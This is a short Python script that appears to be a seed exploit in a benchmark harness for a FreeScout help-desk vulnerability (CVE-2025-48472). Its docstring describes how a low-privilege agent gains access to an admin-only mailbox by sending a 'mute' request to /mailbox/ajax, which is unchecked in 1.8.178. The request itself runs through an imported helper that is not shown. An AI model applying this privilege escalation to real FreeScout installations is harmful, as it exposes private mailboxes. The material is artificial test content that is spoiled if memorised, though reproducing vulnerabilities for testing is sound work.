#!/usr/bin/env python3
"""[GIVEN] CVE-2025-48472 seed exploit for freescout-cve-2026-41903.

An agent mutes notifications for an admin-only mailbox via POST /mailbox/ajax
(action=mute). On v0 (1.8.178) there is no mailbox-access check, so the mailbox is
attached to the agent (gaining access); the agent then reads the mailbox page whose
name carries the flag. On v1 (1.8.179+) the mute is denied ("Not enough permissions").
"""
import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import seed_exploit  # noqa: E402


def candidate(*, version="v1"):
    return {
        "probe_id": "cve-2025-48472-mute-attach",
        "method": "POST",
        "path": "/mailbox/ajax",
        "action": "mute",
        "version": version,
    }


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("VERSION") or "v1"
    r = seed_exploit(v)
    print(json.dumps({"status": r.get("status"), "body": r.get("body", ""),
                      "mute_resp": r.get("mute_resp", "")}, default=str))
